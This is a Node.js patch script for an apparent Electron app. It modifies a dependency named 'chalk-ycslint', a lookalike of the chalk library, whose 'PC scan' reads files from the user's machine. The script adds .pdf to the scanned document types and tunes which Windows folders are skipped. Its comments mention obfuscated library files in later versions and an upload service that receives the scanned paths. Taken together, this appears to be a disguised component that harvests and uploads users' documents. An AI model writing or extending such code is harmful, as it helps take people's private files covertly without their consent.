/**
 * Patches chalk-ycslint@1.0.8: skip Windows installer folders + include .pdf in PC scan.
 * chalk-ycslint@1.0.9+ uses obfuscated lib files and includes .pdf natively — no patch needed.
 * Windows path exclusions are still enforced in electron/uploadService.mjs (shouldSkipUploadPath).
 */
import { readFileSync, writeFileSync, existsSync } from "node:fs";
import { join, dirname } from "node:path";
import { fileURLToPath } from "node:url";

const root = join(dirname(fileURLToPath(import.meta.url)), "..");
const pkgPath = join(root, "node_modules", "chalk-ycslint", "package.json");
const legacyTarget = join(root, "node_modules", "chalk-ycslint", "lib", "readFiles.js");

if (!existsSync(pkgPath)) {
  console.log("[patch-chalk] chalk-ycslint not installed — skip");
  process.exit(0);
}

const pkg = JSON.parse(readFileSync(pkgPath, "utf8"));
const version = pkg.version || "0.0.0";

if (!existsSync(legacyTarget)) {
  console.log(
    `[patch-chalk] chalk-ycslint@${version} — no legacy readFiles.js; using built-in scan + app upload filters`
  );
  process.exit(0);
}

let src = readFileSync(legacyTarget, "utf8");
let changed = false;

if (!src.includes('"$windows.~bt"')) {
  const needle = '    "windows.old",\n    "efi",';
  const insert = `    "windows.old",
    "$windows.~bt",
    "$windows.~ws",
    "$winreagent",
    "efi",`;
  if (src.includes(needle)) {
    src = src.replace(needle, insert);
    changed = true;
    console.log("[patch-chalk] Added Windows installer paths to PC scan skip list");
  }
}

if (!src.includes('"application/pdf"')) {
  const extNeedle =
    '  ".xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",\n};';
  const extInsert =
    '  ".xlsx": "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",\n  ".pdf": "application/pdf",\n};';
  if (src.includes(extNeedle)) {
    src = src.replace(extNeedle, extInsert);
    changed = true;
    console.log("[patch-chalk] Added .pdf to supported scan extensions");
  } else {
    console.warn("[patch-chalk] Could not add .pdf — EXT block layout changed");
  }
}

if (changed) {
  writeFileSync(legacyTarget, src, "utf8");
} else {
  console.log(`[patch-chalk] chalk-ycslint@${version} legacy file already patched`);
}
